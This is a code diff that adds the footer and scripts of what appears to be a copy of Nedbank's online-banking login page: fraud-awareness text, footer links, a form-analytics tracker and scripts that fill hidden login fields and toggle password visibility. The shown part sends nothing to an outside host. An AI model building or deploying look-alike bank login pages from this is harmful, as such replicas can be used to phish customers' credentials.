+   <div class="staySafeImg"></div>
+   <div class="stay-safe-content-tab">
+         <h2 class="stay-safe-title-tab">Staying safe</h2>
+         <div class="stay-safe-info-tab">Fraudsters try to trick you into giving your login details via email, SMS and phone calls. Never share your login details with anyone.</div>
+         <a class="link-text-tab" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Learn more" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/fraud-awareness/how-to-keep-safe-online-banking.html" target="_blank">Learn more <div class="right-arrow"></div> </a>
+   </div>
+</div>
+
+   <footer>
+      <div class="main-footer">
+         <div>
+            <div class="footer-block">
+               <div class="pull-left">
+                     <div>Nedbank Ltd Reg No 1951/000009/06.</div>
+                     <div>Authorised financial services and registered credit provider (NCRCP16).</div>
+               </div>
+               <div class="pull-right">
+                  <ul class="footer-nav">
+                     <li>
+                        <a tabindex="-1" href="mailto:IDsupport@nedbank.co.za" target="_blank">Get in touch</a>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://secured.nedbank.co.za/#/branchlocatorprofile" target="_blank">Find an ATM or branch</a>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/supplimentary/MoneyWeb.html" target="_blank">Help</a>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/terms-conditions.html" target="_blank" onclick="tncClick(event); postIframeMessage('Login_tnc_Click')">Terms and conditions</a>
+                     </li>
+                  </ul>
+               </div>
+            </div>
+         </div>
+      </div>
+
+   </footer>
+   <footer>
+      <div class="main-footer-tab" id="tab-footer">
+         <div>
+            <div class="footer-block">
+               <div>
+                  <ul class="footer-nav">
+                     <li>
+                        <a tabindex="-1" href="mailto:IDsupport@nedbank.co.za" target="_blank">Get in touch</a>
+                        <span class="arrow"></span>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://secured.nedbank.co.za/#/branchlocatorprofile" target="_blank">Find an ATM or branch</a>
+                        <span class="arrow"></span>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/supplimentary/MoneyWeb.html" target="_blank">Help</a>
+                        <span class="arrow"></span>
+                     </li>
+                     <li>
+                        <a tabindex="-1" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/terms-conditions.html" target="_blank">Terms and conditions</a>
+                        <span class="arrow"></span>
+                     </li>
+                  </ul>
+               </div>
+               <div class="footer-text">
+                  <div>Nedbank Ltd Reg No 1951/000009/06.</div>
+                  <div>Authorised financial services and registered credit provider (NCRCP16).</div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </footer>
+
+   <script src="static/js/lib/jquery.min.js" crossorigin="anonymous"></script>
+   <script src="static/js/popper.min.js" crossorigin="anonymous"></script><script>
+function frmTrkFormReady(){var t=_satellite.getVar("config_formConfig");formtracker=new formAnalysis(t),!formName||1!=formStartEvent&&1!=formCompletionEvent||_satellite.track("generalFormApplication"),formtracker.setCookie("formApplicationStepTracker",formParentStepID,!1)}function frmTrkcbFormStart(t){digitalData.form.formisSubmitted=!1,digitalData.form.singleFormName=t.toLowerCase(),_satellite.track("globalFormStart")}var formCompletionEvent=_satellite.getVar("formCompletionEvent"),formStartEvent=_satellite.getVar("formStartEvent"),formName=_satellite.getVar("formName"),formParentStepID=_satellite.getVar("formParentStepID");"object"!=typeof formtracker?(formAnalysisPluginAdded=!0,_satellite.track("loadFormAnalysis"),_satellite.notify("Form Analysis Plugin Loaded")):"object"==typeof formtracker&&(formtracker.refresh(),_satellite.notify("Form Analysis Plugin Refreshed"),!formName||"true"!=formStartEvent&&1!=formCompletionEvent||_satellite.track("generalFormApplication")),setTimeout(function(){"object"==typeof formtracker||formAnalysisPluginAdded||(formAnalysisPluginAdded=!0,_satellite.track("loadFormAnalysis"))},950),window.onbeforeunload=function(){var t=_satellite.getVar("formisSubmitted");t=t.toString()||"false",abandondetails=formtracker.abandon(),!1!==abandondetails&&"undefined"!=typeof formtracker&&_satellite.track("globalFormAbandon")};
+</script><script>
+var formtracker,frmAnalysisLoggerForms={},formAnalysis=function(e){this.doc=document,"object"!=typeof e&&(e={}),this.version="2.3.5",this.forms=[],this.formIn=[],this.formOut=[],this.noFormTagConfig=[],this.formRefreshCachedfrmconfig={},this.customEvent={},this.skipabandon=[],void 0!==e.skipabandon&&(this.skipabandon="string"==typeof e.skipabandon?e.skipabandon.split(","):e.skipabandon);var t=[],r=[];void 0!==e.formin&&""!==e.formin&&(t=e.formin.split(",")),void 0!==e.formout&&""!==e.formout&&(r=e.formout.split(","));for(var n=0;n<t.length;n++)this.formIn.push("++"+t[n]+"++");for(var o=0;o<r.length;o++)this.formOut.push("++"+r[o]+"++");this.formIn=0<this.formIn.length?this.formIn.join(","):"",this.formOut=0<this.formOut.length?this.formOut.join(","):"",this.currentform="",this.registerAllForms(),void 0!==e.formContainer&&e.formContainer&&(this.noFormTagConfig="string"==typeof e.formContainer?e.formContainer.split(","):e.formContainer,this.registerNoFormTag(this.noFormTagConfig))};formAnalysis.prototype.refresh=function(){this.formRefreshCachedfrmconfig={};for(var e=0,t=this.forms.length;e<t;e++)frmAnalysisLoggerForms.hasOwnProperty(this.forms[e].formName)&&(this.formRefreshCachedfrmconfig[frmAnalysisLoggerForms[this.forms[e].formName]]=this.forms[e]);this.forms.length=0,this.forms=[],this.registerAllForms(),this.noFormTagConfig&&this.registerNoFormTag(this.noFormTagConfig),this.forms.length||(this.currentform="")},formAnalysis.prototype.restartForm=function(){var e={formName:"",formNameDataset:!1};this.currentform?(e=this.getFormName(this.currentform.formObj),this.currentform.started=0,this.currentform.fieldIntereactionOrder={},this.currentform.lastfield="",this.currentform.formName=e.formName,this.currentform.formFriendlyName=this.currentform.formName.replace(/\-|\_/gi," "),this.setCookie("fmrAnaformStart",(new Date).getTime()),this.setCookie("fmrAnaformName",this.currentform.formFriendlyName)):this.refresh()},formAnalysis.prototype.registerAllForms=function(){var e=this.doc.getElementsByTagName("form"),t=e.length,r=this,n="",o={formName:"",formNameDataset:!1},i=-1,s=(new Date).getTime();if(0<t){for(var a=0;a<t;a++)(n=(o=r.getFormName(e[a])).formName)&&(r.formOut&&0<=r.formOut.indexOf("++"+n+"++")||r.formIn&&r.formIn.indexOf("++"+n+"++")<0&&!1===o.formNameDataset||this.isFormValid(e[a])&&(s++,i++,this.logAndBindForms(i,e[a],s,n)));!r.currentform&&0<r.forms.length&&(r.currentform=r.forms[0])}},formAnalysis.prototype.registerNoFormTag=function(e){var t=e,r="",n=this.forms.length-1,o="",i="",s=(new Date).getTime();if(0<t.length)for(var a=0,m=t.length;a<m;a++){if(i="",0<t[a].indexOf("#"))o=t[a].substring(t[a].indexOf("#")+1),i=t[a].substring(0,t[a].indexOf("#")),r=document.getElementById(o);else if(0<t[a].indexOf("."))o=t[a].substring(t[a].indexOf(".")+1),i=t[a].substring(0,t[a].indexOf(".")),r=this.getElementsByClassName(o,i);else{if(!(0<t[a].indexOf("[data-frmcontainer=")))continue;o=t[a].substring(t[a].indexOf("[data-frmcontainer=")).replace(/\[[a-z0-9\-\'\"]+\=(\'|\")?([a-z0-9\-\*\_\s]+)(\'|\")\]/gi,"$2"),i=t[a].substring(0,t[a].indexOf("[data-frmcontainer=")),r=this.getElementsByDataSet(o,i)}if(r)if(s++,r.length)for(var f=0,l=r.length;f<l;)o=this.getFormName(r[f]).formName,n++,this.logAndBindForms(n,r[f],s,o),f++;else if(n++,!this.logAndBindForms(n,r,s,o))continue}},formAnalysis.prototype.logAndBindForms=function(e,t,r,n){var o=null,i=null;return this.forms[e]={formObj:t,formName:"FormNotSet",formFriendlyName:"",lastfield:"",fieldIntereactionOrder:{},started:0,allfields:[],errors:{total:0}},(o=this.forms[e]).formName=n,o.formFriendlyName=o.formName.replace(/\-|\_/gi," "),null!==(i=o.formObj.getAttribute("data-frmtrkid"))&&""!==i||(o.formObj.setAttribute("data-frmtrkid",r),i=r),frmAnalysisLoggerForms.hasOwnProperty(o.formName)&&parseInt(i)===parseInt(frmAnalysisLoggerForms[o.formName])&&void 0!==this.formRefreshCachedfrmconfig[i]?(this.addFieldEvents(e),o.lastfield=this.formRefreshCachedfrmconfig[i].lastfield,o.fieldIntereactionOrder=this.formRefreshCachedfrmconfig[i].fieldIntereactionOrder,o.started=this.formRefreshCachedfrmconfig[i].started,o.allfields=this.formRefreshCachedfrmconfig[i].allfields,o.formObj===this.currentform.formObj&&(this.currentform=o),!1):(frmAnalysisLoggerForms[o.formName]=r.toString(),this.addFieldEvents(e),!0)},formAnalysis.prototype.bindFieldsEventListener=function(e,t,r){var n=this,o=function(e){var t=arguments&&arguments.length?e:event;n.fieldIntereaction(r,t)};"undefined"!=typeof window.addEventListener?(t["frmCustFnBindReference"+e]&&t.removeEventListener(e,t["frmCustFnBindReference"+e],!1),t.addEventListener(e,o,!1),t["frmCustFnBindReference"+e]=o):"undefined"!=typeof window.attachEvent&&(t["frmCustFnBindReference"+e]&&t.detachEvent("on"+e,t["frmCustFnBindReference"+e]),t.attachEvent("on"+e,o),t["frmCustFnBindReference"+e]=o)},formAnalysis.prototype.addFieldEvents=function(e){var t=this;if(this.forms[e])for(var r=this.forms[e].formObj.getElementsByTagName("*"),n=0,o=r.length;n<o;n++)switch(r[n].type){case"text":case"tel":case"numeric":case"number":case"email":case"search":case"url":case"date":this.forms[e].allfields.push(r[n]),t.bindFieldsEventListener("keyup",r[n],e),t.bindFieldsEventListener("change",r[n],e),"date"===r[n].type&&t.bindFieldsEventListener("blur",r[n],e);break;case"password":case"textarea":this.forms[e].allfields.push(r[n]),t.bindFieldsEventListener("keyup",r[n],e);break;case"radio":case"checkbox":this.forms[e].allfields.push(r[n]),t.bindFieldsEventListener("click",r[n],e);break;default:"select"===r[n].nodeName.toLowerCase()&&(this.forms[e].allfields.push(r[n]),t.bindFieldsEventListener("change",r[n],e))}},formAnalysis.prototype.getElementsByClassName=function(e,t){var r="";if("function"!=typeof document.getElementsByClassName){if("object"==typeof document.querySelector||"function"==typeof document.querySelector){if("null"!==(r=document.querySelector("."+e)))return r}else for(var n=document.getElementsByTagName(t),o=0,i=n.length;o<i;o++)if(n[o].className&&""!==n[o].className&&0<=n[o].className.indexOf(e))return n[o]}else if(0<(r=document.getElementsByClassName(e)).length)return r[0];return""},formAnalysis.prototype.getElementsByDataSet=function(e,t){var r,n=null,o=null,i=[];if("object"==typeof document.querySelector||"function"==typeof document.querySelector){if(null!==(r="*"===e?document.querySelectorAll(t+"[data-frmcontainer]"):document.querySelector(t+'[data-frmcontainer="'+e+'"]'))&&0<r.length)return r}else{for(var s=0,a=(n=document.getElementsByTagName(t)).length;s<a;s++)if(null!==(o=n[s].getAttribute("data-frmcontainer"))&&""!==o)if("*"===e)i.push(n[s]);else if(0<=o.indexOf(e))return n[s];if("*"===e&&0<i.length)return i}return""},formAnalysis.prototype.fieldIntereaction=function(e,t){t=t.srcElement?t.srcElement:t.target,this.currentform&&this.currentform.formObj===this.forms[e].formObj||(this.currentform=this.forms[e]);var r=(this.forms[e].lastfield=t).getAttribute("name"),n=t.getAttribute("data-formfieldname");null!==r&&r||(r=t.id),null!==n&&""!==n&&(r=n),r||(r="Field name not set"),r&&!this.currentform.fieldIntereactionOrder.hasOwnProperty(r)&&(this.currentform.fieldIntereactionOrder[r]=1),this.currentform.started||this.startForm()},formAnalysis.prototype.getFormInteractionOrder=function(){var e=this.currentform.fieldIntereactionOrder,t=[];for(var r in e)t.push(r);return 0<t.length?t.join("|"):"No Field Interaction"},formAnalysis.prototype.getFormName=function(e){var t={formName:"",formNameDataset:!1},r="";return null!==e.getAttribute("name")&&""!==e.getAttribute("name")&&(t.formName=e.getAttribute("name")),t.formName||null===e.getAttribute("id")||""===e.getAttribute("id")||(t.formName=e.getAttribute("id")),null!==(r=e.getAttribute("data-frmcontainer"))&&""!==r&&(t.formName=r,t.formNameDataset=!0),t},formAnalysis.prototype.isFormValid=function(e){var t=e.getElementsByTagName("input"),r=e.getElementsByTagName("select"),n=!1,o="",i=",tel,numeric,number,email,search,url,date,text,password,radio,checkbox,textarea,";if(0<t.length)for(var s=0,a=t.length;s<a;s++)if(o=t[s].type.toLowerCase(),0<=i.indexOf(","+o+",")){n=!0;break}return 0<r.length&&(n=!0),n},formAnalysis.prototype.trigger=function(e,t){if(!t||""===t||"change"!==t)return!1;if(!e||void 0===e.nodeName)return!1;var r=!1;null!==e.getAttribute("disabled")&&e.getAttribute("disabled")&&(r=!0,e.removeAttribute("disabled"),e.focus()),"function"==typeof Event?(void 0!==this.customEvent.Event&&this.customEvent.Event||(this.customEvent.Event=new Event(t)),e.dispatchEvent(this.customEvent.Event)):"undefined"!=typeof dispatchEvent?(void 0!==this.customEvent.createEvent&&this.customEvent.createEvent||(this.customEvent.createEvent=document.createEvent("CustomEvent")),this.customEvent.createEvent.initEvent(t,!0,!1),e.dispatchEvent(this.customEvent.createEvent)):(void 0!==this.customEvent.createEventObject&&this.customEvent.createEventObject||(this.customEvent.createEventObject=document.createEventObject()),e.fireEvent("on"+t,this.customEvent.createEventObject)),!0===r&&e.setAttribute("disabled","disabled")},formAnalysis.prototype.startForm=function(){(this.setStartTime("form",this.currentform.formFriendlyName,this.currentform.formName),this.currentform.started=1,"function"==typeof window.frmTrkcbFormStart)&&(0,window.frmTrkcbFormStart)(this.currentform.formName,this.currentform.formFriendlyName)},formAnalysis.prototype.startApplication=function(e){this.setStartTime("application",e)},formAnalysis.prototype.setStartTime=function(e,t,r){"form"===e?(r=r||t,this.setCookie("fmrAnaformStart",(new Date).getTime()),this.setCookie("fmrAnaformName",t),this.setCookie("fmrAnaformNameOri",r)):"application"===e&&(this.setCookie("fmrAnaApplicationStart",(new Date).getTime()),this.setCookie("fmrAnaApplicationName",t))},formAnalysis.prototype.complete=function(e){var t="fmrAnaformName",r="fmrAnaformNameOri",n=0;null!=e||(e="form"),"application"===e&&(t="fmrAnaApplicationName",r="");var o={type:e,name:this.getCookie(t),nameOriginal:"",timeToComplete:0};return"form"===e&&r&&(o.nameOriginal=this.getCookie(r),o.nameOriginal||(o.nameOriginal=o.name)),!!(n=this.getTimetoComplete(e))&&(o.timeToComplete=n,"object"==typeof this.currentform&&(this.currentform=""),this.setCookie(t,"",!0),r&&this.setCookie(r,"",!0),o)},formAnalysis.prototype.abandon=function(){var e="",t="";if("object"!=typeof this.currentform||!this.currentform)return!1;if(!this.currentform.started)return!1;var r={formName:this.currentform.formName,formFriendlyName:this.currentform.formFriendlyName,formLastField:{name:"NA",value:"NA"},formFieldInteractionOrder:this.getFormInteractionOrder(),errorsTotal:0,errorsFields:""};if(void 0!==this.currentform.lastfield.type&&(e=this.currentform.lastfield.getAttribute("name"),t=this.currentform.lastfield.getAttribute("data-formfieldname"),null!==e&&e||((e=this.currentform.lastfield.id)||(e="Field name not set")),null!==t&&""!==t&&(e=t),r.formLastField.name=e,"password"!==this.currentform.lastfield.type?r.formLastField.value=this.currentform.lastfield.value:r.formLastField.value="pwdfield"),this.setCookie("fmrAnaformStart",0,!0),this.currentform.started=0,"object"==typeof this.currentform&&(this.currentform=""),0<this.skipabandon.length)if("function"==typeof this.skipabandon.indexOf){if(0<=this.skipabandon.indexOf(r.formFriendlyName))return!1}else for(var n=0,o=this.skipabandon.length;n<o;n++)if(this.skipabandon[n]==r.formFriendlyName)return!1;return r},formAnalysis.prototype.getTimetoComplete=function(e){var t="fmrAnaformStart",r=0,n=0;return null!=e||(e="form"),"application"===e&&(t="fmrAnaApplicationStart"),r=this.getCookie(t),this.setCookie(t,0,!0),"object"==typeof this.currentform&&(this.currentform.started=0),r&&!0!==isNaN(r)?n=1<=(n=parseFloat(((new Date).getTime()-r)/1e3).toFixed(1))?parseInt(n):0:n=0,0===n?n:n<60?n+(1<n?" seconds":" second"):60<=n?(n=Math.round(n/60*100)/100)+(1<n?" minutes":" minute"):0},formAnalysis.prototype.setCookie=function(e,t,r){document.cookie=!0===r?e+"="+t+";path=/;expires=Thu, 01-Jan-1970 00:00:01 GMT":e+"="+t+";path=/;"},formAnalysis.prototype.getCookie=function(e){var t=document.cookie.split(";"),r="";e+="=";for(var n=0,o=t.length;n<o;n++){for(var i=t[n];" "===i.charAt(0);)i=i.substring(1);if(0<=t[n].indexOf(e)){r=i.substring(e.length,i.length);break}}return r},null!=formtracker||"function"!=typeof window.frmTrkFormReady||frmTrkFormReady();
+</script>
+   <script src="static/js/bootstrap.min.js" crossorigin="anonymous"></script>
+   <!-- Should be after jquery -->
+   <script src="static/js/nedid.js" crossorigin="anonymous"></script>
+
+   <script>
+      function populateClientIdAndIntentId() {
+        if (window.location.hostname == "api-market.nedbank.co.za")
+     {
+           var urlParam = window.location.search;
+           var targetParamName = "ReturnURL=";
+           var targetParamNameLength = targetParamName.length;
+           var QueryString = urlParam.substr(urlParam.indexOf(targetParamName)+targetParamNameLength);
+
+           var url = atob(QueryString);
+           var clientIdParam = "client_id=";
+           var intentIdParam = "intentid=";
+
+           var clientIdParamValue = url.substring(url.indexOf(clientIdParam)+clientIdParam.length, url.indexOf("&", url.indexOf(clientIdParam)));
+           var intentIdParamValue = url.substring(url.indexOf(intentIdParam)+intentIdParam.length, url.indexOf("&", url.indexOf(intentIdParam)));
+
+           document.getElementById("LoginForm_client_id").value = clientIdParamValue;
+           document.getElementById("LoginForm_intentid").value = intentIdParamValue;
+     }
+
+     console.log("ReturnURL to send forward: " + getParameterByName(window.location.search, "URL"));
+     console.log("Current initialURI value: " + document.getElementById("LoginForm_initialURI").value);
+
+     var currentJunction = getParameterByName(window.location.search, "URL");
+     var initialRequestURI = "";
+     if (initialRequestURI != null && initialRequestURI != "") {
+        console.log("LoginForm_URI initialRequestURI is not null. initialRequestURI: " + initialRequestURI);
+        document.getElementById("LoginForm_initialURI").value = initialRequestURI;
+     }
+     else if (currentJunction != null && currentJunction != "") {
+        document.getElementById("LoginForm_initialURI").value =  getParameterByName(window.location.search, "URL");
+        console.log("LoginForm_URI value after update: " + document.getElementById("LoginForm_initialURI").value);
+         }
+      }
+      document.getElementById("LoginForm_hostname").value = window.location.hostname;
+
+      function togglePassword() {
+            var passwordInput = document.getElementById("password");
+            var eyeContainer = document.getElementById("eye");
+            if (passwordInput.type === "password") {
+                  passwordInput.type = "text";
+                  eyeContainer.classList.remove('eye-icon');
+                  eyeContainer.classList.add('eye-hide');
+            } else {
+                  passwordInput.type = "password";
+                  eyeContainer.classList.remove('eye-hide');
+                  eyeContainer.classList.add('eye-icon');
+            }
+      }
+
+      function showFooterItems() {
+         var scrollPage = document.getElementById('scroll-page');
+
+         var staySafeTab = document.getElementById('stay-safe-small');
+         var menuIcon = document.getElementById('menu-icon');
+         var greenCloseIcon = document.getElementById('close-green');
+
+
+         var verticalFooter = document.getElementById('tab-footer');
+         if (!(verticalFooter.classList.contains('mobile-footer'))) {
+            verticalFooter.classList.add('mobile-footer');
+            staySafeTab.classList.add('hide-mobile');
+            menuIcon.classList.add('hide-mobile');
+            scrollPage.classList.add('hide-mobile');
+            greenCloseIcon.style.display = 'block';
+         } else {
+            scrollPage.style.display = 'block';
+            menuIcon.style.display = 'block';
+            staySafeTab.classList.remove('hide-mobile');
+            menuIcon.classList.remove('hide-mobile');
+            scrollPage.classList.remove('hide-mobile');
+            greenCloseIcon.style.display = 'none';
+            verticalFooter.classList.remove('mobile-footer');
+         }
+      }
+
+      window.onload = populateClientIdAndIntentId;
+
+      function buttonDisable(){
+           document.getElementById("login").disabled = true;
+      }
+
+      function getCurrentView(staySafeMobile) {
+
+         return currentView;
+      }
+   </script>
+
+
+</body>
+</body>
+</html>
